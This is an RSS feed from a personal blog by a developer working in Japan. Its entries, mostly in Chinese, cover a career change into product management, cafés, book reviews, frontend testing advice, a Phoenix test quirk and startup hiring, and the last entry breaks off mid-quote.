<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   <title>蒋继发 (ThaddeusJiang)</title>
   <link>https://thaddeusjiang.com</link>
   <description>在日本开发 SaaS 产品，爱猫、爱读书、爱大海</description>
   <item>
      <title>2022-03-10 计划转行做【产品经理】了</title>
      <link>https://thaddeusjiang.com/2022-03-10–ji-hua-zhuan-xing-zuo–chan-pin-jing-li–liao</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2022-03-10 计划转行做【产品经理】了</h1>
            <hr>

            <p>其实这个想法很早以前就有了。不过人嘛，总是患得患失不敢轻易做出改变。</p><p><img src="https://user-images.githubusercontent.com/17308201/157680990-19ed5730-3344-4805-8071-84649a15b887.jpg"></p><p>为什么我想做产品？</p><p>虽然我很擅长编写代码，不过相较于编写复杂的算法，我其实只是单纯喜欢创造的快感。所以我对开发高性能、高并发、高可用的后台服务其实没什么兴趣，AI 更是完全提不起兴趣。这注定我无法成为顶尖的“技术专家”。</p><p>虽然我有多年 tech leader 的经验，但是我发现在公司里 tech leader 其实并没有多少可以发挥的空间。受限于项目经费、团队成员、发布期限等等原因，tech leader 经常会做出一些自己觉得可耻的决定（例如：开发某些自己非常反感的产品，删减掉自己引以为傲的功能等等）。</p><p>但是我发现产品经理就没有这些烦恼，产品经理可以天马行空地想象，产品经理可以用 PPT / prototype 演示自己的灵感，产品经理可以独立构想自己的作品。</p><p>我和一些朋友交流这个想法时，大家都以为我是想成为像 Jobs 和 Linus 一样的人。
其实我虽然十分推崇他们的做事风格，但是毕竟没有直接接触过，他们对我的影响其实没有很大。</p><p>真正让我产生做产品的想法是两位中文领域的高手，一位是 61 ，另一位是刘少楠。</p><p>我是从 ScreenOff 开始变成 61 的粉丝的，第一次使用 ScreenOff 时我脑子里的想法就是：“这才是让我怦然心动的 App”，随后我陆续使用了谜底科技的【方块小子】【谜底时钟】。</p><blockquote><div>从技术角度看，能说谜底科技的 App 技术有多难，多高端吗？其实并没有。但是谜底科技的产品就是让我有一个愉悦感，一种舒适感，一种清风拂面、柳暗花明的感觉。</div></blockquote><p>我应该是 flomo 的早期用户了，不过我一直潜水也没有加少楠和 Light 的微信（虽然有很多机会可以加）。
我每天都在使用 flomo，没有高深的使用心得，没有不明觉厉的方法论。我只是把 flomo 当成一个树洞，记录一些读书笔记和心中苦闷而已。</p><blockquote><div>从技术角度，flomo 功能有多强大，有很多革命性创新吗？其实并没有。但是 flomo 是我最常用的产品，是我个人秘密的宝库。</div></blockquote><p>真实工作中的苦闷让我萌生了对开发的厌倦感，61 和 少楠的作品激发了我对产品的一点点期待。另外最近读的一本书《启示录》和一个在日本创业的朋友（Felo.me）让我最终决定要做出这个改变。</p><p><img src="https://user-images.githubusercontent.com/17308201/157674139-e07dad9f-a9ca-4a13-8fb4-c76adce9c086.png"></p><p><img src="https://user-images.githubusercontent.com/17308201/157671566-85605938-3c91-47c1-865f-5449ce4e75a7.jpg"></p><p>祝我好运吧，希望我能在新的领域里做的开心，做的快乐。</p><p>最后，推荐关注他们。</p><ul><li><a class="tc-tiddlylink-external" href="https://twitter.com/liuyi0922" rel="noopener noreferrer" target="_blank">https://twitter.com/liuyi0922</a></li><li><a class="tc-tiddlylink-external" href="https://twitter.com/plidezus" rel="noopener noreferrer" target="_blank">https://twitter.com/plidezus</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Thu, 10 March 2022 23:52:47 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2022-03-10–ji-hua-zhuan-xing-zuo–chan-pin-jing-li–liao</guid>      
   </item>

   <item>
      <title>2022-02-28 工作日的公园就像世外桃源</title>
      <link>https://thaddeusjiang.com/2022-02-28–gong-zuo-ri-de-gong-yuan-jiu-xiang-shi-wai-tao-yuan</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2022-02-28 工作日的公园就像世外桃源</h1>
            <hr>

            <p>2月的最后一天是星期一，本来是工作日但我今天不需要工作。因为是工作日，家里只有我一个人。我是一个非常容易寂寞的人，在家呆到 11 点多心情就开始烦躁了，外面阳光明媚，我决定去公园晒太阳度过这段无聊的时间。</p><p>可能是工作日的原因，整个公园只有我一个人。今天的天很蓝，远处河边的芦苇随风飘动发出沙沙的细声，我躺在椅子上享受温暖的阳光和凉爽的微风。可能是因为只有我一个人，除了风声、水声、鸟儿的叫声没有其他的噪声了，整个世界都好安静啊。</p><p><img src="https://i.gyazo.com/15688f7f86dd86dfda586d72867bf871.jpg"></p><p>安静的世界太美好了，卸载了 Twitter 世界都变的安静了，安静下来的世界真的太美好了。愿世界和平，没有纷争，没有战乱。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 28 February 2022 18:22:22 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2022-02-28–gong-zuo-ri-de-gong-yuan-jiu-xiang-shi-wai-tao-yuan</guid>      
   </item>

   <item>
      <title>2022-01-23 珈琲 さくらの家</title>
      <link>https://thaddeusjiang.com/2022-01-23–jia---—jia</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2022-01-23 珈琲 さくらの家</h1>
            <hr>

            <p>【series/周末的 100 种生活方式】的第一篇，记录一下我的“咖啡店慢游”。</p><p>今天去了舞岡的一家咖啡店，【珈琲　さくらの家】。</p><p><img src="https://i.gyazo.com/191138669cbf067890d686514f4f6c11.jpg"></p><p>这家店的地理位置有点偏僻，出地铁后还要步行十几分钟才能到。从地铁到咖啡店是一条乡路，道路两旁是稻田和牛圈，枯黄的水稻和牲畜的粪便的味道混在在一起，荒凉中透露出一点点的似曾相识的感觉，让我想起了东北老家。
走了大约 15 分钟终于看到了咖啡店，咖啡店和周围的民居形成了强烈的对比，第一眼就知道它很不一样。</p><p>咖啡店是一栋木质建筑，外表看上去很新，但是走进去瞬间就被带回到昭和的世界。年代感满满。店主是一位年过半百的阿姨，个子不高，见我只有一个人就让我坐在柜台（日本语：カウンター）了。柜台的座位是一块实木的树桩，我也需要用一下力气才能把它从柜台下面移动出来。
店里摆着各式各样的装饰品，有一些陶器、一些木制品、编织物，还有本地农家的野菜和果物，虽然没有明确的主题，但是丝毫没有杂乱的感觉，乱中有序的陈列像极了美术馆。</p><p><img src="https://i.gyazo.com/5aa5f449eb832c3c98856ad421b958e9.jpg"></p><p>我点了一杯咖啡和一份烤红薯。我已经喝了一年的手冲咖啡了，对咖啡还算挑剔，这家店的味道还不错，中等偏上。烤红薯应该是这家店的招牌甜点，几乎每桌都在吃。非常推荐大家有条件的话一定要试试咖啡配烤红薯，非常配。</p><p><img src="https://i.gyazo.com/e39bb69fe2456833642a37e3812d544e.jpg"></p><p>续了一杯咖啡，我像逛美术馆一样仔细看了一遍店里的装饰品。听邻桌的客人说店里的摆件都是店主手工做的，只能由衷地佩服。咖啡店经营得像美术馆，生活过得像艺术家，我终于明白为什么那么多想开咖啡店了。</p><p>如果有和我一样喜欢寻找古朴的咖啡店的同好，欢迎线下组局。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 24 January 2022 23:18:6 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2022-01-23–jia---—jia</guid>      
   </item>

   <item>
      <title>2022-01-03 《傅雷家书》读后感</title>
      <link>https://thaddeusjiang.com/2022-01-03—fu-lei-jia-shu–du-hou-gan</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2022-01-03 《傅雷家书》读后感</h1>
            <hr>

            <p>傅雷家书中涉及的内容真的太广泛了，从音乐、艺术到学习、决策、家庭、夫妻相处之道等等。正如傅雷在书信中所言，他愿意化作养料，帮助儿子成长。父母的人生经历如果不能帮助到儿女少走弯路，那么岂不是一种浪费？</p><p>傅雷家书不仅仅体现了傅雷深厚的文学修养和精彩的人生阅历，更将一名优秀的翻译家的基本功展现的淋漓尽致。傅雷写给儿子的书信中辞藻华丽、引经据典，仅从其文学价值上评价也完全不输市面上二流作家写的书。要知道这些书信原本只是父亲和儿子之间的私人内容，书信的内容应该是傅雷日常的语言并没有经过华丽地修饰。这样我想起一部讲茶道的日剧《日日是好日》中的一个片段。茶道老师做茶的境界：</p><blockquote class="tc-quote tc-big-quote"><p>頭が考えなくて、手が勝手に動かす。
</p></blockquote><p>傅雷家书中不仅仅包含傅氏家族的小家，而包含新中国这个大家。傅雷常在书信中教育儿子要感恩，不要忘记回报帮助过自己的人，不要忘记回报国家、不要忘记回报人类。可以看出傅雷是一个坚定的中华文化的继承者，新中国的拥护者。如何热爱和拥护新中国的伟大的翻译家，关心祖国的未来，最后却在文化大革命中被迫害到夫妻双双自尽。这是多么让人唏嘘的事实啊，我想我能理解傅聪选择更改国籍的决定，如果是我，我也会与害死我双亲的人不共戴天。</p><p>阅读傅雷写给儿子的书信时，我的脑子里产生了一个想法。如果我也能想傅雷一样，用尽自己一生的努力，身体力行地让自己的后人成为一名才华横溢、品德高尚、对人类、社会、国家有贡献的人，就像傅雷至于傅聪、张作霖至于张学良，那么我的人生也算是成功的。</p><p>此外，我发现自己真的太喜欢实物了。我非常喜欢书信这种形式，编写书信可以反复推敲用词和语气，篇幅适中适合讨论有深度的内容。我对傅雷家书的喜爱，就像对对达芬奇的手稿的喜爱一样。在 IM (实时聊天工具) 盛行的 IT 时代，交流变得前所未有的便利，却又变得如此的零散，交流变得非常碎片，你一句我一句的交流让思绪变得不再顺畅，概念变得不再完整。我们引以为傲的 IT 时代，估计再也无法留下想《傅雷家书》这样有内容广泛、有深度且文学价值很高的书信集了。</p><p>最后分享几个书中让我引起共鸣的内容：</p><p>傅雷希望傅聪在书信中多多分享自己的见闻，应该尽量地把国外的思潮向国内报道。</p><blockquote class="tc-quote tc-big-quote"><p>一个人对人民的服务不一定要站在大会上演讲或者做什么惊天动地的大事业，随时随地，点点滴滴地把自己的知道的、想到的告诉大家，无形中就是提国家播种、施肥、垦植！
</p><cite>傅雷</cite></blockquote><p>傅雷认为中国人是文明世界中真正快乐的民族。</p><blockquote class="tc-quote tc-big-quote"><p>中国人深信，人应该为了善、为了荣誉、为了公理而为善，而不是为了惧怕永恒的惩罚，而不是为了追求永恒的福祉。</p><p>在中国，一个真正受过良好教养和我们最佳传统与文化熏陶的人，在不知不觉中自然会不追逐名利，不慕虚荣，满足于一种庄严崇高，但物质上相当清贫的生活。
</p><cite>傅雷</cite></blockquote>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 3 January 2022 20:17:32 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2022-01-03—fu-lei-jia-shu–du-hou-gan</guid>      
   </item>

   <item>
      <title>2021-12-28 Phoenix test は css を無視した</title>
      <link>https://thaddeusjiang.com/2021-12-28-phoenix-test—css-—</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-12-28 Phoenix test は css を無視した</h1>
            <hr>

            <p>Phoenix live_view で Responsive Design 画面を実装して、テストを実行する時、下記のケースが失敗した。</p><p><img src="https://user-images.githubusercontent.com/17308201/146661452-378f97f7-d5df-4ed8-ae5a-c86e5f1d84c5.jpg"></p><p>原因：</p><p>Responsive Design 画面を実装する時、同じ目的なボタンが2つを実装した。
ボタンは css で制限して、SP画面もPC画面も唯一ボタンが表示されている。
ユーザーは使う時問題がない、Phoenix test 時 css を無視して失敗した。</p><p>解決方法：</p><ol><li>ボタンを物理的に唯一にする</li><li>test code を修正する</li></ol>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 28 December 2021 10:47:34 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-12-28-phoenix-test—css-—</guid>      
   </item>

   <item>
      <title>2021-12-28 My failure in 2021</title>
      <link>https://thaddeusjiang.com/2021-12-28-my-failure-in-2021</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-12-28 My failure in 2021</h1>
            <hr>

            <p>首先，我要感恩 2021。2012 年我得到的远比想象的要多得多，我对自己这一年的表现很满意。
不过在整理子弹笔记时，我发现今年取得的成绩比往年多，失败也比往年更多。多么有趣的现象啊，我想和大家分享一下。</p><p>那么，2021年我经历过哪些失败呢？（或者不算是失败，是一些我尝试了但没有做出成绩的事）</p><h1 class="">一个生意：帮助国人购买日本药局以获得投资签证，实现肉翻</h1><blockquote><div>1月～2月</div></blockquote><p>今年 1 月份时和朋友讨论了一下“如何帮助国人购买日本药局已获得投资签证，帮助国人肉翻”的生意。当时刚好是年初，对新的一年没有什么规划，抱着闲着也是闲着的心态，我和朋友准备试一下这个生意。我们简单地分析了一下国内的社会环境，判断会有越来越多的人想要肉翻，这应该是一个不小的需求。</p><p>但是这个生意马上就被放弃了。
首先，我们高估了客户的经济实力；其次，我们高估了自己经营一门生意的能力；最后，我们从一开始就没有计划 all in 在这门生意上。
所以，不到 2 个月我和朋友就谁也不提这个生意了。</p><h1 class="">软件工程实践：想要为团队引入敏捷开发</h1><blockquote><div>～3月</div></blockquote><p>因为我自己从 2018 年开始使用 Scrum，我太爱 Scrum 了。
Sprint Planning 让团队的每个人都了解我们需要集中攻克的任务和问题的难度，Sprint Retrospective 让团队为我们取的的成绩感到激动，同时也可以防止我们被日常工作所吞噬而迷失产品原本的方向。</p><p>我收集了一些资料，并整理成简单易懂的文档，主持了几次分享来介绍 Scrum。
但是 teamLab 的项目本质上是外包项目，我们只是乙方。由于甲方使用 waterfall 管理项目，我们无法一厢情愿地使用 agile。</p><p>中国土话：“干活不由东，累死也无功。”</p><h1 class="">中途停止的副业：为一个 OSS 产品提供 SEO 服务</h1><blockquote><div>6月～9月</div></blockquote><p>年中的时候接了一个 SEO 的副业，想要利用自己的 SEO 知识赚点零花钱。
这是一个 diagram as code 产品，OSS，creator 也是比较 nice。</p><p>不过，因为 9 月份我负责的项目 <a class="tc-tiddlylink-external" href="https://smartcompany.jp/" rel="noopener noreferrer" target="_blank">SmartCompany</a> 发布 v1.0，我不想让副业影响到我正常的工作，不得不暂停副业。</p><p>10月份，我得到了一份 Elixir 社区的副业，单价是 SEO 项目的 10 倍。
因为我做的副业级别比较低，本质上就是在出售自己的时间。我的时间是固定的，我也希望它能得到更高的单价。</p><h1 class="">提高影响力的尝试：主持了几次 clubhouse</h1><blockquote><div>6月</div></blockquote><p>相信大家还记得年中时突然火起来的 clubhouse，我也不能免俗的玩了几次。身边的朋友也说 clubhouse 是一个机会，类似于 YouTube 的早期红利期，可以扩展一下圈子和影响力。</p><p>不过，我很快地 clubhouse 这种闲聊单纯就是在浪费时间。本质上社交也是一种资源的交换，你提供有价值的资源，周围聚集起想要交换的人。即然我能提供有价值的资源，那么我想认识的那些人也自然不会拒绝和我交换。线下喝杯咖啡，线上约个交流都是非常高效的方式，clubhouse 就显得太低效了。</p><p>所以我开始认真运营 <a class="tc-tiddlylink-external" href="https://twitter.com/ThaddeusJiang" rel="noopener noreferrer" target="_blank">Twitter</a> 了。</p><h1 class="">中途接手团队：离开了 4 人</h1><blockquote><div>4月～10月</div></blockquote><p>因为我今年换了一份工作，虽然我不觉得自己是空降，但是 29 岁在日本当 leader 确实让很多人不舒服。而且我对团队的要求比前负责人要高很多，有好几个核心成员难以适应我的要求选择了离职。因为成员离职的比较集中，公司 HR 和社长都比较重视。直属上司委婉地提醒我注意一下。</p><p>突然提高工作要求，大家无法接受我能理解。但是面对高要求选择离职，我只能说遗憾。</p><p>不过我借助自己在 Twitter 积极的分享招到了超过离职成员数量的人，并且能力更强。团队的整体实力不减反增了。
虽然做一个受欢迎的 leader 我并不称职，但是做一个给公司带来收益的 leader 我的确很强。</p><h1 class="">感受</h1><p>一年的时间太长，做了很多尝试过却没有取得成果的事。
或许成功学中也有干货，成功学说成功的人不畏惧失败，失败是成功之母。今年的经历的确如此，失败真的没什么，害怕失败最多也就是自尊心的问题，其实对自己一点伤害都没有。
不过不得不承认人的时间和精力是有限的，像我这样东一下西一下的尝试，其实是非常没有效率的。</p><p>2022 年我希望自己更加专注一点，少一点迷茫，工作和生活更轻松一点。为了自己和家人，保持身体健康，做到 work life balance。</p><p>感谢子弹笔记，让我还能记得这么多事情。年末整理的自己的子弹笔记，最大的感受就是“计划永远没有变化快”。😂</p><p><img src="https://pbs.twimg.com/media/FHdQLbAaUAgyQrf?format=jpg&amp;name=small"></p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 28 December 2021 17:51:54 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-12-28-my-failure-in-2021</guid>      
   </item>

   <item>
      <title>2021-12-05 How To Test Frontend</title>
      <link>https://thaddeusjiang.com/2021-12-05-how-to-test-frontend</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-12-05 How To Test Frontend</h1>
            <hr>

            <p>2021 年的最后一个月，重新思考一下 Frontend Testing。对于 Frontend，我们要如何保证项目的品质？</p><p>其实，对于 Frontend Testing 我没有太多独特的见解。我对 Frontend Testing 的理解，大部分是来自其他优秀的工程师的分享，少部分是自己的一些工程实践。对于我自己，Frontend Testing 有哪些内容是值得拿出来分享的？</p><h2 class="">1. 测试一定要整合到 CI/CD 中</h2><p>这是我个人的经验，测试一定要整合到 CI/CD 中。一方面，如果测试没有整合到 CI/CD 中，那么测试就不能阻止我们发布包含错误的产品到生产环境，也就是没有保证品质。另一方面，如果测试没有整合到 CI/CD 将无形地增加开发者的工作量，开发者不得不手动执行测试。很多开发者并不是不愿意编写测试代码，只是不愿意等待测试代码漫长的执行过程。</p><h2 class="">2. 倒金字塔的测试优先级</h2><p>相信绝大多数软件工程专业毕业的的开发者（学院派）都曾被教育 Unit Testing 大于 Integration Testing 的测试覆盖原则，就像金字塔。</p><p>但是，最新的工程实践提出了相反的意见。越来越多的开发者认为 Integration Testing 大于 Unit Testing，甚至 End-to-End Testing 最大。</p><blockquote class="tc-quote tc-big-quote"><p>Write tests. Not too many. Mostly integration. 
</p><cite>rauchg</cite></blockquote><h2 class="">3. Frontend 特有的 Visual Testing</h2><p>Visual Testing 是 Frontend 特有的测试类型。如果你参与的 Frontend 项目还没有引入 Visual Testing，我强烈建议你研究一下。我想说：“Visual Testing saved my life.”</p><p>关于 Visual Testing，我也提倡遵守倒金字塔的优先顺序，这可能和绝大多数开发者的观点有所不同。</p><p>那么，是否我认为 Component Visual Testing 不需要？答案是否定的。
如果项目有足够的时间、预算，我觉得 Component Visual Testing 是 Nice to have。请视情况而定。</p><h2 class="">4. 不要忘记测试你的 Utils</h2><p>请不要简单的认为 Frontend 仅仅是 UI，这是低级的 Backend 和低级的 PM 才会犯的错误。随着软件行业的发展，越来越多的功能被移动到了 Frontend。Frontend 不再只是简简单单地展示数据了。Frontend 中包含了越来越多的复杂逻辑，请不要忘记测试这部分代码。</p><blockquote class="tc-quote tc-big-quote"><p>优秀的 Frontend 项目，页面展示和逻辑处理一定是相互独立的，所以不要忘记测试你的 Utils。
</p><cite>TJ</cite></blockquote><h2 class="">5. React Testing Example</h2><p><a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/react-testing-example" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/react-testing-example</a></p><p>这是我曾经做内部分享时创建的项目，目的是展示 React 项目如何进行测试。
很久没有更新了，不过大致思路和本篇文章没有改变。
可以当作本篇文章的实践参考吧。</p><h2 class="">6. Nice To Have</h2><ol><li>最好覆盖不同的屏幕大小。</li><li>最好可以保留测试截屏或录屏。</li><li>最好使用 JS 社区的测试框架、工具和平台。</li><li>...</li></ol><h2 class="">最后，推荐一些我很喜欢的 Frontend 测试框架、工具和平台</h2><ul><li>TypeScript</li><li>Jest</li><li>Cypress</li><li>Mock Service Worker</li><li>GitHub Actions</li><li>Checkly</li><li>...</li></ul><p>参考</p><ul><li><a class="tc-tiddlylink-external" href="https://rauchg.com/2020/develop-preview-test" rel="noopener noreferrer" target="_blank">Develop, Preview, Test</a></li><li><a class="tc-tiddlylink-external" href="https://kentcdodds.com/blog/write-tests" rel="noopener noreferrer" target="_blank">Write tests. Not too many. Mostly integration.</a></li><li><a class="tc-tiddlylink-external" href="https://twitter.com/swyx/status/1261202288476971008" rel="noopener noreferrer" target="_blank">Integration &gt; Unit tests is the new conventional wisdom.</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 6 December 2021 22:36:17 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-12-05-how-to-test-frontend</guid>      
   </item>

   <item>
      <title>2021-11-06 《卡片笔记写作法》-让我明白写作不应该从空白页开始</title>
      <link>https://thaddeusjiang.com/2021-11-06—ka-pian-bi-ji-xie-zuo-fa—rang-wo-ming-bai-xie-zuo-bu-ying-gai-cong-kong-bai-ye-kai-shi</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-11-06 《卡片笔记写作法》-让我明白写作不应该从空白页开始</h1>
            <hr>

            <p>这本书是刘少楠老师推荐的，上次阅读了少楠老师推荐的《和佛陀一起吃早餐》之后感受收获颇丰，这次依然十分精彩。本书让我不经意地想起《子弹笔记》，这本书让我有一次产生下面想法：</p><blockquote class="tc-quote tc-big-quote"><p>这不仅仅是一本介绍某种方法的书，书中的思考方式有极其广泛的扩展性，是一本可以指导人生的书。
</p></blockquote><p>其实我很早就知道笔记的重要性，并积极学习多种笔记方法，如《零秒思考》中的 A4 纸笔记法、《一张纸整理术》中的方格笔记法、《子弹笔记》中的子弹笔记法等等。
但是我还是不满足，因为我始终觉得这些笔记不够强大，没有办法支持我的各种需求，尤其是写作灵感。
季羡林曾经用一句玩笑话比喻写作的灵感，“水喝多了，尿自然就有了。”</p><p>我觉得自己的阅读量不少，但是每次想写点什么时总是觉得没有灵感。</p><p>本书教会我的最重要的事：写作不应该从空白页开始。</p><blockquote><div>德国著名学者卢曼基于学习心理学的洞察，借鉴久经考验的笔记技术，使用卡片盒笔记写作法，积&gt;累了 9万张知识卡片，一生中写了 58本书和上百篇论文。</div></blockquote><p>书中分享卢曼的写作就是从卡片盒中找到某个主题，然后把相关卡片进行删减、排序、整理就完了。卢曼从没有从一张空白页开始自己的写作，卢曼的写作内容都不是从脑子里回忆的，而是从卡片盒中提取。</p><p>看看自己的积累的笔记，我想这个方法应该页非常适合我。接下来要做的就是：找到某个主题、对卡片进行删减、排序，然后整理成文。</p><p><img src="https://i.gyazo.com/9bbfa185c3e4cdfc6f8455551e0e3637.jpg">
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Sat, 6 November 2021 23:30:43 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-11-06—ka-pian-bi-ji-xie-zuo-fa—rang-wo-ming-bai-xie-zuo-bu-ying-gai-cong-kong-bai-ye-kai-shi</guid>      
   </item>

   <item>
      <title>2021-10-18 聊聊 start-up(小公司) 招聘工程师</title>
      <link>https://thaddeusjiang.com/2021-10-18–liao-liao-start-up–xiao-gong-si—zhao-pin-gong-cheng-shi</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-10-18 聊聊 start-up(小公司) 招聘工程师</h1>
            <hr>

            <p>首先，非常抱歉。由于我个人没有去过大厂，所以没有资格讨论大厂的招聘。
不过，自大学毕业到现在也算是面试过一些 start-up(小公司)，并日常在公司担当招聘面试官，所以想和大家分享一下 start-up 招聘。</p><p>在谈招聘之前，我希望和大家分享一下 start-up 的一般情况。</p><ol><li>并不是每个 start-up 都能成为阿里巴巴、字节跳动。</li><li>80% start-up 没有足够的预算用高薪招聘足够的优秀的工程师。</li><li>start-up 的工作并不比大厂简单，有时甚至更难。</li></ol><p>综上所述上，start-up 其实很难找到适合的工程师。优秀的工程师又是 start-up 成功不可或缺的关键因素，真的是愁死人了。</p><h2 class="">start-up 需要什么样的工程师？</h2><ol><li>能解决问题</li><li>愿意跨出舒适圈</li><li>有产品思维</li></ol><p>虽然很多大厂在招聘信息中也会提到上面的要求，但是对于 start-up 这些都是刚需，对于大厂却不是。
大厂完全有能力让员工各司其职，毕竟分工与合作是提升效率的有效手段，这一点在工业革命时代就被无数的工厂证明过了。</p><p>由于 start-up 对工程师有不同于大厂的期待，也导致 start-up 没办法直接套用行业通用的测试题来筛选候选人。不过这是可以理解的，正如《黑客与画家》中有一段话。</p><blockquote class="tc-quote tc-big-quote"><p>在大型组织内部，有一个专门的术语描述这种跟随大多数人的选择的做法，叫做“业界最佳实践”。这个词出现的原因其实就是为了让你的经理可以推卸责任。既然我选择的是“业界最佳实践”，如果不成功，项目失败了，那么你也无法指责我，因为做出选择的人不是我，而是整个“业界”。
